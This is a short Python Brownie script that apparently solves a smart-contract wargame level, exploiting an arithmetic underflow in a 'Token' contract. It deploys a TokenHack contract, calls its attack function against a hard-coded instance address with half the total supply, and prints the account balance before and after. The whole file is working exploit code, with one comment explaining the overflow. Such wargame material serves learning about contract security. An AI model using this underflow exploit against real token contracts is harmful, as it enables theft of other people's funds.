from brownie import TokenHack, Token, Contract, accounts

INSTANCE_ADDRESS = "0x22F3e92572BDd35a58B3401CF47bea303FCb5d01"
ACCOUNT = "straul"


def get_account():
    account = accounts.load(ACCOUNT)
    return account


def hack_token(account):
    token = Contract.from_abi(name="Token", address=INSTANCE_ADDRESS, abi=Token.abi)
    token_hack = TokenHack.deploy({'from': account})

    # 'Token' is not protected agains arithmetic overflows so we call the transfer
    # function with a big value to cause an underflow and manipulate the balances

    print(f"Balance of {account.address} before hack: {token.balanceOf(account.address)}")

    token_hack.attack(token.address, token.totalSupply() / 2, {'from': account})
    # token.transfer(account.address, 1e5, {'from': account})

    print(f"Balance of {account.address} after hack: {token.balanceOf(account.address)}")



def main():
    account = get_account()
    hack_token(account)